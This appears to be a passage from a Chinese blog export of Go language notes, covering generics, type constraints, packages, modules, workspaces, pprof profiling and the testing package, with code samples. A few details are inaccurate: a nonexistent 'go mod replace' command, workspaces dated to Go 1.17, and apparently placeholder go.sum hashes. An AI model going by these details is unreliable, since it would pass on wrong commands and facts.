<h1 id="泛型编程（generic-programming）"><a href="#泛型编程（generic-programming）" class="headerlink" title="泛型编程（generic programming）"></a>泛型编程（generic programming）</h1><h2 id="类型参数（Type-parameter）"><a href="#类型参数（Type-parameter）" class="headerlink" title="类型参数（Type parameter）"></a>类型参数（Type parameter）</h2><ul>
<li>类型参数声明（Type parameter declaration）是一种支持泛型编程的机制，可以在函数、结构体等类型中定义泛型类型</li>
</ul>
<div class="tabs" id="go-generic-programming"><ul class="nav-tabs"><li class="tab active"><a href="#go-generic-programming-1">UsedInStruct</a></li><li class="tab"><a href="#go-generic-programming-2">UsedInInterface</a></li><li class="tab"><a href="#go-generic-programming-3">UsedInFunction</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-generic-programming-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [T any] is type parameter</span></span><br><span class="line"><span class="keyword">type</span> Node[T any] <span class="keyword">struct</span> &#123;</span><br><span class="line">    Value T</span><br><span class="line">    Next  *Node[T]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    iN := &amp;Node[<span class="type">int</span>]&#123;Value: <span class="number">1</span>&#125;</span><br><span class="line">    sN := &amp;Node[<span class="type">string</span>]&#123;Value: <span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    iN.Next = &amp;Node[<span class="type">int</span>]&#123;Value: <span class="number">2</span>&#125;</span><br><span class="line">    sN.Next = &amp;Node[<span class="type">string</span>]&#123;Value: <span class="string">&quot;b&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(iN.Value, iN.Next.Value) <span class="comment">// 1 2</span></span><br><span class="line">    fmt.Println(sN.Value, sN.Next.Value) <span class="comment">// a b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-generic-programming-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define generic interface</span></span><br><span class="line"><span class="keyword">type</span> Stack[T any] <span class="keyword">interface</span> &#123;</span><br><span class="line">    Push(value T)</span><br><span class="line">    Pop() T</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> IntStack <span class="keyword">struct</span> &#123;</span><br><span class="line">    values []<span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *IntStack)</span></span> Push(value <span class="type">int</span>) &#123;</span><br><span class="line">    s.values = <span class="built_in">append</span>(s.values, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *IntStack)</span></span> Pop() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s.values) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    value := s.values[<span class="built_in">len</span>(s.values)<span class="number">-1</span>]</span><br><span class="line">    s.values = s.values[:<span class="built_in">len</span>(s.values)<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> StringStack <span class="keyword">struct</span> &#123;</span><br><span class="line">    values []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *StringStack)</span></span> Push(value <span class="type">string</span>) &#123;</span><br><span class="line">    s.values = <span class="built_in">append</span>(s.values, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *StringStack)</span></span> Pop() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s.values) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    value := s.values[<span class="built_in">len</span>(s.values)<span class="number">-1</span>]</span><br><span class="line">    s.values = s.values[:<span class="built_in">len</span>(s.values)<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    iS := &amp;IntStack&#123;&#125;</span><br><span class="line">    sS := &amp;StringStack&#123;&#125;</span><br><span class="line"></span><br><span class="line">    iS.Push(<span class="number">3</span>)</span><br><span class="line">    iS.Push(<span class="number">4</span>)</span><br><span class="line">    sS.Push(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    sS.Push(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(iS.Pop(), iS.Pop(), iS.Pop()) <span class="comment">// 4 3 0</span></span><br><span class="line">    fmt.Println(sS.Pop(), sS.Pop(), iS.Pop()) <span class="comment">// b a 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-generic-programming-3"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Generic function</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Swap</span>[<span class="title">T1</span>, <span class="title">T2</span> <span class="title">any</span>]<span class="params">(a T1, b T2)</span></span> (T2, T1) &#123;</span><br><span class="line">    <span class="keyword">return</span> b, a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    x, y := Swap(<span class="number">1</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    fmt.Println(x, y) <span class="comment">// a 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="类型约束（Type-constraint）"><a href="#类型约束（Type-constraint）" class="headerlink" title="类型约束（Type constraint）"></a>类型约束（Type constraint）</h2><ul>
<li>类型约束（Type constraint）是一种泛型编程的机制，用于限制泛型类型的范围，使得其只能是指定的类型或者其子类型</li>
</ul>
<div class="tabs" id="go-type-constraint"><ul class="nav-tabs"><li class="tab active"><a href="#go-type-constraint-1">Basic</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-type-constraint-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> &#123;</span><br><span class="line">    Speak() <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dog)</span></span> Speak() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;woof&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 限制泛型类型T为Animal接口的实现类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Speak</span>[<span class="title">T</span> <span class="title">Animal</span>]<span class="params">(a T)</span></span> &#123;</span><br><span class="line">    fmt.Println(a.Speak())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 限制结构体的字段类型T必须为Animal接口的实现类型</span></span><br><span class="line"><span class="keyword">type</span> Pet[T Animal] <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name   <span class="type">string</span></span><br><span class="line">    Animal T</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    dog := &amp;Dog&#123;Name: <span class="string">&quot;A&quot;</span>&#125;</span><br><span class="line">    Speak(dog) <span class="comment">// woof</span></span><br><span class="line"></span><br><span class="line">    pet := &amp;Pet[Animal]&#123;Name: <span class="string">&quot;B&quot;</span>, Animal: dog&#125;</span><br><span class="line">    fmt.Println(pet.Name, pet.Animal.Speak()) <span class="comment">// B woof</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="包（package）"><a href="#包（package）" class="headerlink" title="包（package）"></a>包（package）</h1><ul>
<li>一个包的所有实现通常要放在同一个目录下，其中的所有源文件具有相同的包名（PackageName）</li>
<li>每个源文件都要在顶部定义其属于的包，例如<code>package main</code></li>
<li>通过<code>import</code>来导入外部的标识符（identifier）<ul>
<li>导入路径通常是相对于包的安装路径的文件路径</li>
<li>当导入路径省略 PackageName 时，默认为当前文件所属的包</li>
<li>当导入路径有<code>.</code>前缀时，指所有的标识符都会导入过来，且无需通过前缀限定符进行访问（accessed）</li>
<li><strong>非法操作</strong>：<ul>
<li>当前文件直接或间接的导入自己是非法的</li>
<li>未使用导入包中的任何标识符是非法的</li>
<li>不允许产生循环依赖（cyclic dependencies）</li>
</ul>
</li>
</ul>
</li>
<li>包的初始化：<ul>
<li>源文件内可以实现<code>init() &#123; ... &#125;</code>函数（无参数且无返回值），在包中的变量初始化完毕后自动调用它<ul>
<li><code>init()</code>函数不能被外部引用</li>
<li>文件 p 顶部有<code>import q</code>时，q 的<code>init()</code>函数一定是先于 p 中的代码执行的</li>
<li>所有的<code>init()</code>函数都在<code>mian()</code>函数之前执行的</li>
</ul>
</li>
<li>包内的所有 package-level 的变量与<code>init()</code>函数在单个 goroutine 中执行，且<code>init()</code>函数内也可以启动其他 goroutine，这些 goroutine 是并发运行的，但是编译器会保证在前一项返回后才会继续下一项</li>
<li>包内的文件是按照文件名的词法顺序交给编译器的，以确保初始化行为是可复现的</li>
</ul>
</li>
<li>main 包：<ul>
<li>每个可执行程序都必须有一个非导入的 main 包，且其中要定义函数<code>func main() &#123; ... &#125;</code>（无函数且无返回值）</li>
<li><code>main()</code>函数返回后，程序即会退出，而且不会等待其他 non-main 的 goroutine 完成</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-package"><ul class="nav-tabs"><li class="tab active"><a href="#go-package-1">import</a></li><li class="tab"><a href="#go-package-2">init()</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-package-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>   <span class="string">&quot;lib/math&quot;</span> <span class="comment">// math.Sin（无前缀，需要带限定符math访问Sin）</span></span><br><span class="line"><span class="keyword">import</span> m <span class="string">&quot;lib/math&quot;</span> <span class="comment">// m.Sin (前缀限定符别名，可以通过别名访问Sin)</span></span><br><span class="line"><span class="keyword">import</span> . <span class="string">&quot;lib/math&quot;</span> <span class="comment">// Sin (前缀&#x27;.&#x27;表示无需提供限定符访问Sin)</span></span><br><span class="line"><span class="keyword">import</span> _ <span class="string">&quot;lib/math&quot;</span> <span class="comment">// (前缀&#x27;_&#x27;作为别名导入，表示只想执行此包下的init())</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-package-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> user == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        log.Fatal(<span class="string">&quot;$USER not set&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> home == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        home = <span class="string">&quot;/home/&quot;</span> + user</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> gopath == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        gopath = home + <span class="string">&quot;/go&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// gopath may be overridden by --gopath flag on command line.</span></span><br><span class="line">    flag.StringVar(&amp;gopath, <span class="string">&quot;gopath&quot;</span>, gopath, <span class="string">&quot;override default GOPATH&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="模块（module）"><a href="#模块（module）" class="headerlink" title="模块（module）"></a>模块（module）</h1><ul>
<li>模块（module）在 go v1.11 版本支持，是一起发布的包（package）的集合，可以直接从版本控制仓库下载<ul>
<li>版本（version）可看成模块的快照，通常用来参与命名模块子目录的名字，例如<code>tools@v0.1.1</code><ul>
<li>对于向后不兼容的版本，主版本号（major）递增，次要（minor）版本和分支（patch）版本从 0 开始</li>
<li>对于向后兼容的版本，public 接口变化了，major 版本不变，minor 递增，patch 从 0 开始</li>
<li>对于 public 接口没有变化的版本，只递增 patch 版本</li>
<li><code>v1.2.3-pre</code>表示预发版本，其下一个版本应该为<code>v1.2.3</code></li>
</ul>
</li>
<li><code>GO111MODULE</code>环境变量控制 go 命令的运行模式<ul>
<li><code>GO111MODULE=on</code>表示在模块感知模式（module-aware mode，go v1.16 默认）</li>
<li><code>GO111MODULE=off</code>表示在 GOPATH 模式（GOPATH mode）</li>
</ul>
</li>
</ul>
</li>
<li><code>go.mod</code>文件放在模块根（root）目录，包含模块的依赖信息，采用 UTF-8 编码，设计为利于人阅读且机器可写的<ul>
<li><code>module golang.org/x/net</code> 定义模块路径（module path）<ul>
<li>模块定义在仓库根路径时，模块路径等于仓库根路径（repository root path）</li>
<li>模块未定义在仓库根路径时，模块路径是仓库根路径（repository root path）的某个子目录</li>
<li>如果模块发布更高版本，模块路径必须以版本结尾（例如后缀<code>/v2</code>），且可以不创建版本后缀名字的子目录</li>
</ul>
</li>
</ul>
</li>
<li><code>go.sum</code>文件通常在<code>go.mod</code>旁边，包含依赖模块的 hash 值<ul>
<li>go 命令下载模块到缓存（GOMODCACHE）中时，会计算其 hash 值，然后与主模块的<code>go.sum</code>进行校验</li>
</ul>
</li>
<li><code>go mod</code>命令：<ul>
<li><code>go mod init example.com/mymodule</code> 初始化模块并创建 go.mod 文件</li>
<li><code>go mod tidy</code> 整理模块依赖关系，移除未使用的依赖包</li>
<li><code>go mod download</code> 下载模块依赖包，用于前期离线安装</li>
<li><code>go mod vendor</code> 将依赖包复制到 vendor 目录下，用于离线安装</li>
<li><code>go mod verify</code> 验证已下载的依赖包的完整性和安全性</li>
<li><code>go mod graph</code> 打印模块依赖关系的有向无环图</li>
<li><code>go mod why github.com/gorilla/mux</code> 查找某个依赖包被引用的原因</li>
<li><code>go mod edit -require github.com/gorilla/mux@v1.8.0</code> 编辑 go.mod，新增依赖包</li>
<li><code>go mod replace github.com/gorilla/mux =&gt; ../mux</code> 编辑 go.mod，用本地路径或 URL 替代某个依赖包</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-module"><ul class="nav-tabs"><li class="tab active"><a href="#go-module-1">go.mod</a></li><li class="tab"><a href="#go-module-2">go.sum</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-module-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">module example.com/mymodule</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="number">1.16</span></span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">    github.com/gorilla/mux v1<span class="number">.8</span><span class="number">.0</span></span><br><span class="line">    github.com/google/uuid v1<span class="number">.2</span><span class="number">.0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">replace github.com/gorilla/mux =&gt; ../mux</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-module-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">github.com/gorilla/mux v1<span class="number">.8</span><span class="number">.0</span> h1:RfXUfC5V7eJZ5XMZx1pT9yGn1Z9z7tIVpw6HxL0wQwI=</span><br><span class="line">github.com/gorilla/mux v1<span class="number">.8</span><span class="number">.0</span>/<span class="keyword">go</span>.mod h1:<span class="number">6</span>Yp1pP1T8UaW+<span class="number">6</span>RJLyNnLd8eGqN5zFz2jwvzgQu7+mE=</span><br><span class="line">github.com/google/uuid v1<span class="number">.2</span><span class="number">.0</span> h1:<span class="number">5</span>P4W5LdYdG5PQ+<span class="number">4</span>Jk5VXUyXe9iVzS6d6C0PWp7fQv08=</span><br><span class="line">github.com/google/uuid v1<span class="number">.2</span><span class="number">.0</span>/<span class="keyword">go</span>.mod h1:<span class="number">8</span>ZkLX2W/YptI9ZJnWgKxI1Zn4mQ6q8GVV6wRj1L4zB4=</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="工作空间（workspace）"><a href="#工作空间（workspace）" class="headerlink" title="工作空间（workspace）"></a>工作空间（workspace）</h1><ul>
<li>工作空间（workspace）在 go v1.17 版本支持，是磁盘上模块（module）的集合</li>
<li><code>GOWORK</code>环境变量控制是否启用工作空间<ul>
<li>未定义或空值时，会从当前工作目录开始向上搜索<code>go.work</code>文件<ul>
<li>找到<code>go.work</code>后，工作空间为此文件中定义的 module 路径</li>
<li>未找到<code>go.work</code>时，工作空间为当前工作目录下的 modules</li>
</ul>
</li>
<li>有定义时，工作空间为环境变量中定义的 module 路径</li>
</ul>
</li>
<li><code>go.work</code>定义工作空间中各个模块的相对路径</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://go.dev/ref/spec">The Go Programming Language Specification</a><br>[2] <a href="https://go.dev/doc/effective_go">Effective Go</a><br>[3] <a href="https://github.com/geektutu/high-performance-go">high performance coding with golang</a><br>[4] <a href="https://gfw.go101.org/">Go语言101</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Go标准库</title>
    <url>/ProgrammingLanguage/Go/StandardLibrary.html</url>
    <content><![CDATA[<p>Go标准库梳理。</p>
<span id="more"></span>

<h1 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h1><h2 id="pprof"><a href="#pprof" class="headerlink" title="pprof"></a>pprof</h2><ul>
<li>pprof用于分析程序的cpu和memory性能，由两部分组成：<ul>
<li>运行时库：<code>import runtime/pprof</code></li>
<li>分析工具：<code>go tool pprof</code><ul>
<li><code>go tool pprof xxx.pprof</code>   以交互命令行模式</li>
<li><code>go tool pprof -no_browser -http=0.0.0.0:9999 xxx.pprof</code> 以web-ui模式</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-pprof"><ul class="nav-tabs"><li class="tab active"><a href="#go-pprof-1">CPU</a></li><li class="tab"><a href="#go-pprof-2">Memory</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-pprof-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dep/sort.go</span></span><br><span class="line"><span class="keyword">package</span> dep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Generate</span><span class="params">(n <span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    nums := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        nums = <span class="built_in">append</span>(nums, rand.Int())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Bubble</span><span class="params">(nums []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">1</span>; j &lt; <span class="built_in">len</span>(nums)-i; j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> nums[j] &lt; nums[j<span class="number">-1</span>] &#123;</span><br><span class="line">                nums[j], nums[j<span class="number">-1</span>] = nums[j<span class="number">-1</span>], nums[j]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main/main.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;runtime/pprof&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;example.com/dep&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    f, _ := os.OpenFile(<span class="string">&quot;cpu.pprof&quot;</span>, os.O_CREATE|os.O_RDWR, <span class="number">0644</span>)</span><br><span class="line">    <span class="keyword">defer</span> f.Close()</span><br><span class="line">    pprof.StartCPUProfile(f)</span><br><span class="line">    <span class="keyword">defer</span> pprof.StopCPUProfile()</span><br><span class="line"></span><br><span class="line">    n := <span class="number">10</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        nums := dep.Generate(n)</span><br><span class="line">        dep.Bubble(nums)</span><br><span class="line">        n *= <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-pprof-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dep/sort.go</span></span><br><span class="line"><span class="keyword">package</span> dep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> letterBytes = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">randomString</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    b := <span class="built_in">make</span>([]<span class="type">byte</span>, n)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> b &#123;</span><br><span class="line">        b[i] = letterBytes[rand.Intn(<span class="built_in">len</span>(letterBytes))]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConcatRandomString</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    s := <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        s += randomString(n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConcatRandomStringByBuilder</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> s strings.Builder</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; n; i++ &#123;</span><br><span class="line">        s.WriteString(randomString(n))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.String()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main/main.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;example.com/dep&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/pkg/profile&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> profile.Start(</span><br><span class="line">        profile.MemProfile,</span><br><span class="line">        profile.MemProfileRate(<span class="number">1</span>),</span><br><span class="line">        profile.ProfilePath(<span class="string">&quot;.&quot;</span>)).Stop()</span><br><span class="line">    dep.ConcatRandomString(<span class="number">100</span>)</span><br><span class="line">    dep.ConcatRandomStringByBuilder(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="testing"><a href="#testing" class="headerlink" title="testing"></a>testing</h1><ul>
<li>package 可定制测试进程的入口函数<code>func TestMain(m *testing.M)</code><ul>
<li><code>TestMain</code> 影响package内的每一个测试用例</li>
<li><code>TestMain</code> 实现中可以封装setup和teardown功能</li>
</ul>
</li>
<li><code>go test</code> 命令通用选项：<ul>
<li><code>-v</code> 显示每个用例的测试结果</li>
<li><code>-cover</code> 查看覆盖率</li>
</ul>
</li>
<li>辅助函数：<ul>
<li><code>t.Error()</code> 错误提示，不会中断测试过程</li>
<li><code>t.Fatal()</code> 错误提示，会终止测试过程</li>
<li><code>t.Helper()</code>  标注为帮助函数后，报错信息回溯到上一级行号，有助于定位</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-testing"><ul class="nav-tabs"><li class="tab active"><a href="#go-testing-1">TestMain</a></li><li class="tab"><a href="#go-testing-2">t.Helper</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-testing-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dep/main_test.go</span></span><br><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">setup</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Before all tests&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">teardown</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;After all tests&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestMain</span><span class="params">(m *testing.M)</span></span> &#123;</span><br><span class="line">    setup()</span><br><span class="line">    code := m.Run()</span><br><span class="line">    teardown()</span><br><span class="line">    os.Exit(code)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-testing-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dep/calc.go</span></span><br><span class="line"><span class="keyword">package</span> dep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Mul</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dep/calc_test.go</span></span><br><span class="line"><span class="keyword">package</span> dep_test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;example.com/dep&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> calcCase <span class="keyword">struct</span>&#123; A, B, Expected <span class="type">int</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createMulTestCase</span><span class="params">(t *testing.T, c *calcCase)</span></span> &#123;</span><br><span class="line">    t.Helper() <span class="comment">// 标注为帮助函数，报错时会提示堆栈上一级行号，提示更清晰</span></span><br><span class="line">    <span class="keyword">if</span> ans := dep.Mul(c.A, c.B); ans != c.Expected &#123;</span><br><span class="line">        t.Fatalf(<span class="string">&quot;%d * %d expected %d, but %d got&quot;</span>,</span><br><span class="line">            c.A, c.B, c.Expected, ans)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestMulOnHelper</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    createMulTestCase(t, &amp;calcCase&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>&#125;)</span><br><span class="line">    createMulTestCase(t, &amp;calcCase&#123;<span class="number">2</span>, <span class="number">-3</span>, <span class="number">-6</span>&#125;)</span><br><span class="line">    createMulTestCase(t, &amp;calcCase&#123;<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>&#125;) <span class="comment">// wrong case</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

